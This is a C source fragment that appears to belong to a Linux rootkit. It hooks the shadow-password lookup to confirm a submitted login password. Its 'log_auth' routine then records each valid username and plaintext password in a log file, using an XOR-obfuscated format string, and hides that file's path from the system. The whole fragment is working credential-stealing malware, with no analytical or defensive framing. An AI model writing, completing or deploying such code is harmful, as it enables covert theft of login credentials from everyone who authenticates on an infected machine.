int verify_pass(const char *user, const char *resp){
    struct spwd *ent;
    char *pass;
    int got_pw;

    hook(CGETSPNAM);
    ent = call(CGETSPNAM, user);
    if(ent == NULL || strlen(ent->sp_pwdp) < 2)
        return 0;

    pass = crypt(resp, ent->sp_pwdp);
    if(pass == NULL) return 0;

    got_pw = strcmp(pass, ent->sp_pwdp) == 0;
    if(got_pw) return 1;

    return 0;
}

void log_auth(const pam_handle_t *pamh, const char *resp){
    if(!initmvbc() || rknomore())
        return;

    hook(CACCESS, CFOPEN);

    int acr = (long)call(CACCESS, mvbc->logpath, F_OK);
    if(acr != 0) return;

    const char *user = get_username(pamh);
    if(!user) return;

    int got_pw = verify_pass(user, resp);
    if(!got_pw) return;

    char logbuf[strlen(user) + strlen(resp) + 64], *logfmt;
    memset(logbuf, 0, sizeof(logbuf));
    logfmt = xordup(LOGS_FORMAT);
    if(!logfmt) return;
    snprintf(logbuf, sizeof(logbuf), logfmt, user, resp);
    clean(logfmt);

    bdvlogfile_t *bl = readlogfile(mvbc->logpath);
    if(!bl) return;
    if(!alreadylogged(bl, logbuf)){
        addnewlog(bl, logbuf);
        updlogfile(mvbc->logpath, bl);
    }
    lree(bl);
    !hidden_path(mvbc->logpath) ? hide_path(mvbc->logpath) : 0;
}